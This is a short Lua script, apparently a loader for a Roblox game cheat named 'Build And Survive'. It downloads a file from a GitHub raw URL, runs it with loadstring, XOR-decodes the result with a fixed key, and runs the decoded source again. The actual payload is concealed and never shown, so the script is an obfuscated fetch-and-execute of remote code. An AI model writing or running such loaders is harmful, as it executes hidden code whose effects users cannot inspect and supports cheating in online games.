local KEY = 73
local url = "https://raw.githubusercontent.com/musicmaker-web/Roblox-Scripts/refs/heads/main/Build%20And%20Survive.lua"
local encrypted = loadstring(game:HttpGet(url))()

local decrypted = {}
for i = 1, #encrypted do
    decrypted[i] = string.char(bit32.bxor(encrypted:byte(i), KEY))
end

local source = table.concat(decrypted)
loadstring(source)()
